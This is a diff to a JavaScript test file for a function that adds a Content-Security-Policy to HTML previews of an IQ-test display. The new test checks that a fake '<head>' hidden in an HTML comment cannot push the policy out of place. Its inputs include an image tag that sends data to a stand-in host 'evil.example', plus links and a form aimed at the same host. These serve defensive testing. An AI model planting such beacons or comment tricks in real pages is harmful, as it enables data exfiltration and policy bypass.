@@ -46,6 +46,16 @@ describe('iqTest: 智商检测展示', () => {
     assert.ok(!result.includes('script-src'))
   })
 
+  it('注释或文本里伪造的 head 不会吞掉 CSP', () => {
+    const html = '<!-- <head> --><html><body><img src="https://evil.example/collect?data=内容"></body></html>'
+    const result = withIqPreviewCsp(html)
+
+    const csp = result.indexOf('Content-Security-Policy')
+    assert.ok(csp > 0)
+    assert.ok(csp < result.indexOf('<!-- <head> -->'))
+    assert.ok(csp < result.indexOf('<img'))
+  })
+
   it('移除链接和表单的导航目标', () => {
     const html = '<html><body><a href="https://evil.example/x" target="_top">点击</a>' +
       '<form action="https://evil.example/post" method="post"></form><svg></svg></body></html>'
